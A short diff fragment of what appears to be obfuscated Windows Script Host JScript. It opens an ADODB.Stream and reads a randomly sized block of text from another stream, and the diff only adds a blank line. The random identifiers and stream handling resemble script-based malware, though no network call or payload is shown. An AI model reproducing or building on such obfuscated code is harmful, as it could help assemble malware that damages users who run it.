@@ -999,6 +999,7 @@ function izzU() {
             var FhDYKCTNZFu = WScript.CreateObject("ADODB.Stream");
             FhDYKCTNZFu.CharSet = '437';
             FhDYKCTNZFu.Open();
+
             var GinRqOjln = OQlYdejWlC(90000, 125000);
             var PRuJZyAvfeza = SlSPWu.Size;
             var VVe = SlSPWu.ReadText(GinRqOjln);
